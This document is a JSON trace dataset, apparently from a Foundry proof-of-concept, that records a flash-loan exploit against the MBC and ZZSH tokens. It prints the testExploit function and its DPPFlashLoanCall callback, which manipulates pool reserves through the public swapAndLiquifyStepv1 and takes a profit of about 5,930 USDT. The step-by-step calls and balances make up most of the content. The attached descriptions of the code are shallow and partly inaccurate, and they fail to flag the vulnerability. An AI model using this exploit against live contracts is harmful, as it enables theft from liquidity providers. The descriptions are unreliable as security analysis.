[
    {
        "id": "850691",
        "args": "",
        "original_code": "    function testExploit() public {\n        USDT.approve(address(Router), type(uint256).max);\n        MBC.approve(address(Router), type(uint256).max);\n        ZZSH.approve(address(Router), type(uint256).max);\n        dodoFlahloanAmount = USDT.balanceOf(dodo);\n        DVM(dodo).flashLoan(0, dodoFlahloanAmount, address(this), new bytes(1));\n\n        emit log_named_decimal_uint(\"[End] Attacker USDT balance after exploit\", USDT.balanceOf(address(this)), 18);\n    }\n\n",
        "description": "1. Core functions:  \nThe `testExploit` function is designed to simulate an exploit scenario. It first grants maximum approval to a `Router` contract for three different tokens (USDT, MBC, and ZZSH). Then, it retrieves the balance of USDT tokens held by a specific `dodo` address and initiates a flash loan for that amount from the `DVM` contract. Finally, it emits an event to log the attacker's USDT balance after the exploit.\n\n2. Security mechanism:  \nThe function does not include explicit security mechanisms like access control or input validation. However, it relies on the underlying `approve` and `flashLoan` functions of the respective contracts, which may have their own security measures. The use of `type(uint256).max` for approvals is a common practice but can be risky if the `Router` contract is compromised.\n\n3. Parameter Function:  \nThe function does not take any parameters. It operates using predefined contract addresses (`USDT`, `MBC`, `ZZSH`, `Router`, and `dodo`) and internal logic to calculate the `dodoFlahloanAmount`. The `flashLoan` function is called with specific parameters: `0` (indicating no ETH loan), `dodoFlahloanAmount` (the USDT amount to borrow), `address(this)` (the borrower's address), and `new bytes(1)` (a placeholder for additional data).\n\n4. Return description:  \nThe function does not return any value. Instead, it emits an event (`log_named_decimal_uint`) that logs the attacker's USDT balance after the exploit. The balance is calculated using `USDT.balanceOf(address(this))`, which retrieves the USDT balance of the contract executing the function.\n\nIn summary,  \nThe `testExploit` function simulates an exploit by granting maximum token approvals, initiating a flash loan, and logging the attacker's USDT balance. It lacks explicit security measures but relies on the security of the underlying contracts. The function does not take parameters or return values but emits an event to track the outcome of the exploit.",
        "return_value": "Returned"
    },
    {
        "id": "24562",
        "args": "0x10ED43C718714eb63d5aA57B78B54704E256024E, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]",
        "original_code": "    function approve(address spender, uint256 amount)\n    public\n    virtual\n    override\n    returns (bool)\n    {\n        _approve(_msgSender(), spender, amount);\n        return true;\n    }\n\n",
        "description": "1. **Core functions:**  \n   This function allows a user to give permission to another address (called `spender`) to spend a specific amount of tokens on their behalf. It essentially authorizes the `spender` to transfer tokens up to the specified `amount` from the user's account.\n\n2. **Security mechanism:**  \n   - The function is marked as `public`, meaning it can be called by anyone.  \n   - It is also `virtual` and `override`, indicating it can be customized or replaced in derived contracts.  \n   - The function uses `_msgSender()` to securely identify the caller, ensuring the correct user is granting the approval.  \n\n3. **Parameter Function:**  \n   - `spender`: The address of the account that is being granted permission to spend tokens.  \n   - `amount`: The maximum number of tokens the `spender` is allowed to transfer.  \n\n4. **Return description:**  \n   The function always returns `true` to indicate that the approval process was successful. It does not perform any complex calculations but simply confirms the action was completed.  \n\nIn summary, this function enables a user to authorize another address to spend a specific amount of their tokens, ensuring the process is secure and straightforward.",
        "return_value": "true"
    },
    {
        "id": "24661",
        "args": "0x10ED43C718714eb63d5aA57B78B54704E256024E, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "24661",
        "args": "0x10ED43C718714eb63d5aA57B78B54704E256024E, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "2531",
        "args": "0x9ad32e3054268B849b84a8dBcC7c8f7c52E4e69A",
        "original_code": "    function balanceOf(address account)\n    public\n    view\n    virtual\n    override\n    returns (uint256)\n    {\n        return _balances[account];\n    }\n\n",
        "description": "1. **Core functions**:  \n   This function is designed to check the balance of a specific account. It looks up the amount of tokens or assets associated with the given account address and returns that value. It\u2019s a simple read-only function that doesn\u2019t modify any data.\n\n2. **Security mechanism**:  \n   The function uses the `view` modifier, which ensures it only reads data and doesn\u2019t make any changes to the blockchain state. The `public` modifier allows it to be called by anyone, while the `virtual` and `override` modifiers indicate it can be customized or replaced in derived contracts.\n\n3. **Parameter Function**:  \n   The `account` parameter is the address of the user whose balance is being checked. It acts as the key to look up the corresponding balance in the `_balances` mapping.\n\n4. **Return description**:  \n   The function returns the balance of the specified account by directly accessing the `_balances` mapping. The output is a number (uint256) representing the amount of tokens or assets held by the account.\n\nIn summary, this function is a straightforward tool for checking the balance of a specific account, ensuring it\u2019s secure and read-only while providing the requested information.",
        "return_value": "794994271783747229185351 [7.949e23]"
    },
    {
        "id": "721713",
        "args": "0, 794994271783747229185351 [7.949e23], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x00",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "27971",
        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 794994271783747229185351 [7.949e23]",
        "original_code": "    function transfer(address recipient, uint256 amount)\n    external\n    returns (bool);\n\n",
        "description": "1. **Core functions:**  \n   The `transfer` function is designed to move a specific amount of tokens from the sender's account to another account, referred to as the `recipient`. Its primary role is to facilitate the transfer of tokens within the system.\n\n2. **Security mechanism:**  \n   The function is marked as `external`, meaning it can only be called from outside the contract, ensuring it cannot be accessed internally. This helps limit potential misuse. Additionally, the function returns a `bool` value to indicate whether the transfer was successful, allowing for error handling and verification.\n\n3. **Parameter Function:**  \n   - `recipient`: This is the address of the account that will receive the tokens. It specifies where the tokens are being sent.  \n   - `amount`: This is the number of tokens to be transferred. It defines the quantity of tokens moving from the sender to the recipient.\n\n4. **Return description:**  \n   The function returns a `bool` value (`true` or `false`) to indicate whether the transfer was successful. If the transfer is completed without issues, it returns `true`. If there is a problem (e.g., insufficient balance), it returns `false`.\n\nIn summary, the `transfer` function allows tokens to be sent from one account to another, ensures it can only be called externally, and provides a way to confirm whether the transfer was successful.",
        "return_value": "true"
    },
    {
        "id": "667405",
        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0, 794994271783747229185351 [7.949e23], 0x00",
        "original_code": "    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {\n        // Intial rate MBC/USDT -> 1.1365032200116891/1\n        // Pair getReserves -> 12475110456913920021663 / 10976748888389080860664\n        address[] memory path = new address[](2);\n        path[0] = address(USDT);\n        path[1] = address(MBC);\n        uint256[] memory values = Router.getAmountsOut(150_000 * 10 ** 18, path);\n\n        USDT.transfer(address(MBCPair), 150_000 * 10 ** 18);\n\n        MBCPair.swap(values[1], 0, address(this), \"\");\n\n        MBC.swapAndLiquifyStepv1();\n\n        // MBCPair.sync(); // unnecessary\n\n        // Altered rate MBC/USDT -> 0.0052991665156216445/1\n        // Pair getReserves -> 900258815097978209431 / 169886870405763976494888\n\n",
        "description": "1. **Core functions:**  \n   This function is designed to execute a flash loan operation involving two tokens, USDT and MBC. It first calculates the expected output amount of MBC tokens based on a given input of USDT tokens using a predefined path. Then, it transfers a specific amount of USDT to a trading pair contract and swaps it for MBC tokens. After the swap, it triggers a liquidity-related function (`swapAndLiquifyStepv1`) to manage the liquidity of the MBC token. The function essentially facilitates a token swap and liquidity management process in a single transaction.\n\n2. **Security mechanism:**  \n   The function uses the `external` modifier, which restricts its access to external calls only, ensuring it cannot be called internally within the contract. Additionally, the function relies on the `transfer` and `swap` methods of the token and pair contracts, which are standard and secure operations in decentralized finance (DeFi). However, there is no explicit access control or reentrancy guard, which could pose risks if not handled carefully in the broader contract context.\n\n3. **Parameter Function:**  \n   - `sender`: Represents the address initiating the flash loan call. It is not actively used in the function but could be logged or checked for additional security.  \n   - `baseAmount` and `quoteAmount`: These parameters represent the amounts of the two tokens involved in the flash loan. However, they are not directly used in the function logic, as the function hardcodes the USDT amount (150,000 * 10^18).  \n   - `data`: This parameter allows for additional data to be passed into the function, but it is unused in the current implementation.  \n\n4. **Return description:**  \n   The function does not return any value directly. Instead, it performs a series of operations: calculating token swap amounts, transferring tokens, executing the swap, and managing liquidity. The result of these operations is reflected in the updated balances and reserves of the involved tokens and trading pairs.\n\n**In summary,**  \nThis function executes a flash loan operation by swapping USDT for MBC tokens and managing liquidity. It uses standard DeFi mechanisms but lacks explicit security measures like access control or reentrancy protection. The parameters provide flexibility for future enhancements, though they are not currently utilized. The function\u2019s impact is seen in the updated token balances and reserves rather than a direct return value.",
        "return_value": "Returned"
    },
    {
        "id": "9651",
        "args": "150000000000000000000000 [1.5e23], [0x55d398326f99059fF775485246999027B3197955, 0x4E87880A72f6896E7e0a635A5838fFc89b13bd17]",
        "original_code": null,
        "description": null,
        "return_value": "[150000000000000000000000 [1.5e23], 11622466224903562048186 [1.162e22]]"
    },
    {
        "id": "2893",
        "args": "",
        "original_code": null,
        "description": null,
        "return_value": "12475110456913920021663 [1.247e22], 10976748888389080860664 [1.097e22], 1669705943 [1.669e9]"
    },
    {
        "id": "8071",
        "args": "0x5b1Bf836fba1836Ca7ffCE26f155c75dBFa4aDF1, 150000000000000000000000 [1.5e23]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "124225",
        "args": "11622466224903562048186 [1.162e22], 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "89721",
        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 11622466224903562048186 [1.162e22]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "664",
        "args": "0x5b1Bf836fba1836Ca7ffCE26f155c75dBFa4aDF1",
        "original_code": null,
        "description": null,
        "return_value": "852644232010357973563 [8.526e20]"
    },
    {
        "id": "531",
        "args": "0x5b1Bf836fba1836Ca7ffCE26f155c75dBFa4aDF1",
        "original_code": null,
        "description": null,
        "return_value": "160976748888389080860664 [1.609e23]"
    },
    {
        "id": "115628",
        "args": "",
        "original_code": "    function swapAndLiquifyStepv1() public {\n        uint256 ethBalance = ETH.balanceOf(address(this));\n        uint256 tokenBalance = balanceOf(address(this));\n        addLiquidityUsdt(tokenBalance, ethBalance);\n    }\n\n",
        "description": "1. **Core functions**:  \n   The `swapAndLiquifyStepv1` function is designed to perform a liquidity addition process. It first retrieves the balance of ETH and the token held by the contract itself. Then, it uses these balances to add liquidity by calling the `addLiquidityUsdt` function. This function is typically used in decentralized finance (DeFi) applications to ensure that there is sufficient liquidity in a trading pair.\n\n2. **Security mechanism**:  \n   The function is marked as `public`, meaning it can be called by anyone. However, there are no explicit security modifiers like `onlyOwner` or `require` checks in this specific function. This could pose a risk if the function is called maliciously or unintentionally. To enhance security, it might be necessary to add access controls or validation checks to ensure the function is only called under specific conditions.\n\n3. **Parameter Function**:  \n   This function does not take any parameters. It relies on the internal state of the contract to determine the balances of ETH and the token. Specifically, it uses `ETH.balanceOf(address(this))` to get the ETH balance and `balanceOf(address(this))` to get the token balance of the contract.\n\n4. **Return description**:  \n   The function does not return any value. Its primary purpose is to execute the `addLiquidityUsdt` function using the retrieved ETH and token balances. The outcome of this function is the addition of liquidity to the pool, but no specific value is returned to the caller.\n\nIn summary, the `swapAndLiquifyStepv1` function is a straightforward utility for adding liquidity using the contract's ETH and token balances. It lacks explicit security measures, which could be a concern, and it does not return any value, focusing instead on executing the liquidity addition process.",
        "return_value": "Returned"
    },
    {
        "id": "2531",
        "args": "0x4E87880A72f6896E7e0a635A5838fFc89b13bd17",
        "original_code": null,
        "description": null,
        "return_value": "8910121517374895634224 [8.91e21]"
    },
    {
        "id": "103254",
        "args": "0x55d398326f99059fF775485246999027B3197955, 0x4E87880A72f6896E7e0a635A5838fFc89b13bd17, 8910121517374895634224 [8.91e21], 467358936187192577934 [4.673e20], 0, 0, 0x77bAC6826BD30E01c5dF4C0810B1e01F2AdaecB4, 1669726874 [1.669e9]",
        "original_code": null,
        "description": null,
        "return_value": "8910121517374895634224 [8.91e21], 47194167920290574428 [4.719e19], 632669642148061983731 [6.326e20]"
    },
    {
        "id": "2676",
        "args": "0x55d398326f99059fF775485246999027B3197955, 0x4E87880A72f6896E7e0a635A5838fFc89b13bd17",
        "original_code": null,
        "description": null,
        "return_value": "0x5b1Bf836fba1836Ca7ffCE26f155c75dBFa4aDF1"
    },
    {
        "id": "893",
        "args": "",
        "original_code": null,
        "description": null,
        "return_value": "852644232010357973563 [8.526e20], 160976748888389080860664 [1.609e23], 1669726874 [1.669e9]"
    },
    {
        "id": "13634",
        "args": "0x4E87880A72f6896E7e0a635A5838fFc89b13bd17, 0x5b1Bf836fba1836Ca7ffCE26f155c75dBFa4aDF1, 8910121517374895634224 [8.91e21]",
        "original_code": "    function transferFrom(\n        address from,\n        address to,\n        uint256 value\n    ) external returns (bool);\n\n",
        "description": "1. **Core functions:**  \nThe `transferFrom` function is designed to move a specified amount of tokens from one address (`from`) to another address (`to`). It is commonly used in scenarios where a third party (like a smart contract or another user) is authorized to transfer tokens on behalf of the token owner. This function is essential for enabling delegated transfers in token systems.\n\n2. **Security mechanism:**  \nThe function includes the `external` modifier, which ensures it can only be called from outside the contract, preventing internal misuse. Additionally, it typically relies on an underlying approval mechanism, where the `from` address must have previously approved the caller to spend the specified `value` of tokens. This approval acts as a safeguard to prevent unauthorized transfers.\n\n3. **Parameter Function:**  \n- `from`: The address from which tokens are being transferred. This address must have sufficient tokens and must have approved the caller to transfer tokens on its behalf.  \n- `to`: The address receiving the tokens. This is the destination of the transfer.  \n- `value`: The amount of tokens to be transferred. This must be a non-negative number and should not exceed the balance of the `from` address or the approved limit.\n\n4. **Return description:**  \nThe function returns a `bool` value (`true` or `false`) to indicate whether the transfer was successful. If the transfer is completed without issues, it returns `true`. If there are any problems (e.g., insufficient balance, lack of approval), it returns `false`.\n\nIn summary,  \nThe `transferFrom` function allows a third party to transfer tokens from one address to another, provided the sender has approved the transfer. It uses security measures like external access control and approval checks to ensure safe and authorized transactions. The function returns a boolean value to confirm the success or failure of the transfer.",
        "return_value": "true"
    },
    {
        "id": "15786",
        "args": "0x4E87880A72f6896E7e0a635A5838fFc89b13bd17, 0x5b1Bf836fba1836Ca7ffCE26f155c75dBFa4aDF1, 47194167920290574428 [4.719e19]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "61036",
        "args": "0x77bAC6826BD30E01c5dF4C0810B1e01F2AdaecB4",
        "original_code": null,
        "description": null,
        "return_value": "632669642148061983731 [6.326e20]"
    },
    {
        "id": "664",
        "args": "0x5b1Bf836fba1836Ca7ffCE26f155c75dBFa4aDF1",
        "original_code": null,
        "description": null,
        "return_value": "899838399930648547991 [8.998e20]"
    },
    {
        "id": "531",
        "args": "0x5b1Bf836fba1836Ca7ffCE26f155c75dBFa4aDF1",
        "original_code": null,
        "description": null,
        "return_value": "169886870405763976494888 [1.698e23]"
    },
    {
        "id": "2354",
        "args": "",
        "original_code": null,
        "description": null,
        "return_value": "0x0ED943Ce24BaEBf257488771759F9BF482C39706"
    },
    {
        "id": "3271",
        "args": "0x5b1Bf836fba1836Ca7ffCE26f155c75dBFa4aDF1, 1001",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "664",
        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
        "original_code": null,
        "description": null,
        "return_value": "10692668926911277084252 [1.069e22]"
    },
    {
        "id": "30371",
        "args": "0x5b1Bf836fba1836Ca7ffCE26f155c75dBFa4aDF1, 10692668926911277084252 [1.069e22]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "465",
        "args": "",
        "original_code": null,
        "description": null,
        "return_value": "0x4E87880A72f6896E7e0a635A5838fFc89b13bd17"
    },
    {
        "id": "397",
        "args": "",
        "original_code": null,
        "description": null,
        "return_value": "0x55d398326f99059fF775485246999027B3197955"
    },
    {
        "id": "893",
        "args": "",
        "original_code": null,
        "description": null,
        "return_value": "899838399930648547991 [8.998e20], 169886870405763976494888 [1.698e23], 1669726874 [1.669e9]"
    },
    {
        "id": "531",
        "args": "0x5b1Bf836fba1836Ca7ffCE26f155c75dBFa4aDF1",
        "original_code": null,
        "description": null,
        "return_value": "169886870405763976495889 [1.698e23]"
    },
    {
        "id": "664",
        "args": "0x5b1Bf836fba1836Ca7ffCE26f155c75dBFa4aDF1",
        "original_code": null,
        "description": null,
        "return_value": "899838399930648547991 [8.998e20]"
    },
    {
        "id": "893",
        "args": "",
        "original_code": null,
        "description": null,
        "return_value": "899838399930648547991 [8.998e20], 169886870405763976494888 [1.698e23], 1669726874 [1.669e9]"
    },
    {
        "id": "664",
        "args": "0x5b1Bf836fba1836Ca7ffCE26f155c75dBFa4aDF1",
        "original_code": null,
        "description": null,
        "return_value": "10736110087147747624015 [1.073e22]"
    },
    {
        "id": "5111",
        "args": "9836271687217099076024 [9.836e21], [0x4E87880A72f6896E7e0a635A5838fFc89b13bd17, 0x55d398326f99059fF775485246999027B3197955]",
        "original_code": null,
        "description": null,
        "return_value": "[9836271687217099076024 [9.836e21], 155615250870445917394455 [1.556e23]]"
    },
    {
        "id": "893",
        "args": "",
        "original_code": null,
        "description": null,
        "return_value": "899838399930648547991 [8.998e20], 169886870405763976494888 [1.698e23], 1669726874 [1.669e9]"
    },
    {
        "id": "18502",
        "args": "0, 155615250870445917394455 [1.556e23], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "3271",
        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 155615250870445917394455 [1.556e23]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "664",
        "args": "0x5b1Bf836fba1836Ca7ffCE26f155c75dBFa4aDF1",
        "original_code": null,
        "description": null,
        "return_value": "10736110087147747624015 [1.073e22]"
    },
    {
        "id": "531",
        "args": "0x5b1Bf836fba1836Ca7ffCE26f155c75dBFa4aDF1",
        "original_code": null,
        "description": null,
        "return_value": "14271619535318059101434 [1.427e22]"
    },
    {
        "id": "9611",
        "args": "150000000000000000000000 [1.5e23], [0x55d398326f99059fF775485246999027B3197955, 0xeE04a3f9795897fd74b7F04Bb299Ba25521606e6]",
        "original_code": null,
        "description": null,
        "return_value": "[150000000000000000000000 [1.5e23], 305455891023788359040 [3.054e20]]"
    },
    {
        "id": "2893",
        "args": "",
        "original_code": null,
        "description": null,
        "return_value": "13207730083446253382868 [1.32e22], 332419158933835275685 [3.324e20], 1669723294 [1.669e9]"
    },
    {
        "id": "8071",
        "args": "0x33CCA0E0CFf617a2aef1397113E779E42a06a74A, 150000000000000000000000 [1.5e23]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "115571",
        "args": "0, 305455891023788359040 [3.054e20], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "81122",
        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 305455891023788359040 [3.054e20]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "531",
        "args": "0x33CCA0E0CFf617a2aef1397113E779E42a06a74A",
        "original_code": null,
        "description": null,
        "return_value": "163207730083446253382868 [1.632e23]"
    },
    {
        "id": "598",
        "args": "0x33CCA0E0CFf617a2aef1397113E779E42a06a74A",
        "original_code": null,
        "description": null,
        "return_value": "26963267910046916685 [2.696e19]"
    },
    {
        "id": "118822",
        "args": "",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "2531",
        "args": "0xeE04a3f9795897fd74b7F04Bb299Ba25521606e6",
        "original_code": null,
        "description": null,
        "return_value": "1525554339326077833068 [1.525e21]"
    },
    {
        "id": "108236",
        "args": "0x55d398326f99059fF775485246999027B3197955, 0xeE04a3f9795897fd74b7F04Bb299Ba25521606e6, 1525554339326077833068 [1.525e21], 6441594929497596671 [6.441e18], 0, 0, 0xCdC0B32AB15D1F5ECdC5Aa51d0F9ed98B18a1562, 1669726874 [1.669e9]",
        "original_code": null,
        "description": null,
        "return_value": "1525554339326077833068 [1.525e21], 252034204149229631 [2.52e17], 18615973487734598921 [1.861e19]"
    },
    {
        "id": "2676",
        "args": "0x55d398326f99059fF775485246999027B3197955, 0xeE04a3f9795897fd74b7F04Bb299Ba25521606e6",
        "original_code": null,
        "description": null,
        "return_value": "0x33CCA0E0CFf617a2aef1397113E779E42a06a74A"
    },
    {
        "id": "893",
        "args": "",
        "original_code": null,
        "description": null,
        "return_value": "163207730083446253382868 [1.632e23], 26963267910046916685 [2.696e19], 1669726874 [1.669e9]"
    },
    {
        "id": "13634",
        "args": "0xeE04a3f9795897fd74b7F04Bb299Ba25521606e6, 0x33CCA0E0CFf617a2aef1397113E779E42a06a74A, 1525554339326077833068 [1.525e21]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "26028",
        "args": "0xeE04a3f9795897fd74b7F04Bb299Ba25521606e6, 0x33CCA0E0CFf617a2aef1397113E779E42a06a74A, 252034204149229631 [2.52e17]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "465",
        "args": "",
        "original_code": null,
        "description": null,
        "return_value": "0x55d398326f99059fF775485246999027B3197955"
    },
    {
        "id": "397",
        "args": "",
        "original_code": null,
        "description": null,
        "return_value": "0xeE04a3f9795897fd74b7F04Bb299Ba25521606e6"
    },
    {
        "id": "893",
        "args": "",
        "original_code": null,
        "description": null,
        "return_value": "163207730083446253382868 [1.632e23], 26963267910046916685 [2.696e19], 1669726874 [1.669e9]"
    },
    {
        "id": "598",
        "args": "0x33CCA0E0CFf617a2aef1397113E779E42a06a74A",
        "original_code": null,
        "description": null,
        "return_value": "26963267910046916685 [2.696e19]"
    },
    {
        "id": "531",
        "args": "0x33CCA0E0CFf617a2aef1397113E779E42a06a74A",
        "original_code": null,
        "description": null,
        "return_value": "164733284422772331215936 [1.647e23]"
    },
    {
        "id": "58326",
        "args": "0xCdC0B32AB15D1F5ECdC5Aa51d0F9ed98B18a1562",
        "original_code": null,
        "description": null,
        "return_value": "18615973487734598921 [1.861e19]"
    },
    {
        "id": "531",
        "args": "0x33CCA0E0CFf617a2aef1397113E779E42a06a74A",
        "original_code": null,
        "description": null,
        "return_value": "164733284422772331215936 [1.647e23]"
    },
    {
        "id": "598",
        "args": "0x33CCA0E0CFf617a2aef1397113E779E42a06a74A",
        "original_code": null,
        "description": null,
        "return_value": "27215302114196146316 [2.721e19]"
    },
    {
        "id": "354",
        "args": "",
        "original_code": null,
        "description": null,
        "return_value": "0x0ED943Ce24BaEBf257488771759F9BF482C39706"
    },
    {
        "id": "3271",
        "args": "0x33CCA0E0CFf617a2aef1397113E779E42a06a74A, 1001",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "598",
        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
        "original_code": null,
        "description": null,
        "return_value": "294764934837955766435 [2.947e20]"
    },
    {
        "id": "25431",
        "args": "0x33CCA0E0CFf617a2aef1397113E779E42a06a74A, 294764934837955766435 [2.947e20]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "465",
        "args": "",
        "original_code": null,
        "description": null,
        "return_value": "0x55d398326f99059fF775485246999027B3197955"
    },
    {
        "id": "397",
        "args": "",
        "original_code": null,
        "description": null,
        "return_value": "0xeE04a3f9795897fd74b7F04Bb299Ba25521606e6"
    },
    {
        "id": "893",
        "args": "",
        "original_code": null,
        "description": null,
        "return_value": "164733284422772331215936 [1.647e23], 27215302114196146316 [2.721e19], 1669726874 [1.669e9]"
    },
    {
        "id": "598",
        "args": "0x33CCA0E0CFf617a2aef1397113E779E42a06a74A",
        "original_code": null,
        "description": null,
        "return_value": "27215302114196146316 [2.721e19]"
    },
    {
        "id": "531",
        "args": "0x33CCA0E0CFf617a2aef1397113E779E42a06a74A",
        "original_code": null,
        "description": null,
        "return_value": "164733284422772331216937 [1.647e23]"
    },
    {
        "id": "893",
        "args": "",
        "original_code": null,
        "description": null,
        "return_value": "164733284422772331215936 [1.647e23], 27215302114196146316 [2.721e19], 1669726874 [1.669e9]"
    },
    {
        "id": "598",
        "args": "0x33CCA0E0CFf617a2aef1397113E779E42a06a74A",
        "original_code": null,
        "description": null,
        "return_value": "311663454582823460506 [3.116e20]"
    },
    {
        "id": "5151",
        "args": "284448152468627314190 [2.844e20], [0xeE04a3f9795897fd74b7F04Bb299Ba25521606e6, 0x55d398326f99059fF775485246999027B3197955]",
        "original_code": null,
        "description": null,
        "return_value": "[284448152468627314190 [2.844e20], 150315428016130395876159 [1.503e23]]"
    },
    {
        "id": "893",
        "args": "",
        "original_code": null,
        "description": null,
        "return_value": "164733284422772331215936 [1.647e23], 27215302114196146316 [2.721e19], 1669726874 [1.669e9]"
    },
    {
        "id": "18425",
        "args": "150315428016130395876159 [1.503e23], 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "3271",
        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 150315428016130395876159 [1.503e23]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "531",
        "args": "0x33CCA0E0CFf617a2aef1397113E779E42a06a74A",
        "original_code": null,
        "description": null,
        "return_value": "14417856406641935340778 [1.441e22]"
    },
    {
        "id": "598",
        "args": "0x33CCA0E0CFf617a2aef1397113E779E42a06a74A",
        "original_code": null,
        "description": null,
        "return_value": "311663454582823460506 [3.116e20]"
    },
    {
        "id": "3271",
        "args": "0x9ad32e3054268B849b84a8dBcC7c8f7c52E4e69A, 794994271783747229185351 [7.949e23]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "2531",
        "args": "0x9ad32e3054268B849b84a8dBcC7c8f7c52E4e69A",
        "original_code": null,
        "description": null,
        "return_value": "41478384743744576047 [4.147e19]"
    },
    {
        "id": "531",
        "args": "0x9ad32e3054268B849b84a8dBcC7c8f7c52E4e69A",
        "original_code": null,
        "description": null,
        "return_value": "794994271783747229185351 [7.949e23]"
    },
    {
        "id": "531",
        "args": "0x9ad32e3054268B849b84a8dBcC7c8f7c52E4e69A",
        "original_code": null,
        "description": null,
        "return_value": "41478384743744576047 [4.147e19]"
    },
    {
        "id": "531",
        "args": "0x9ad32e3054268B849b84a8dBcC7c8f7c52E4e69A",
        "original_code": null,
        "description": null,
        "return_value": "794994271783747229185351 [7.949e23]"
    },
    {
        "id": "531",
        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
        "original_code": null,
        "description": null,
        "return_value": "5930678886576313268612 [5.93e21]"
    }
]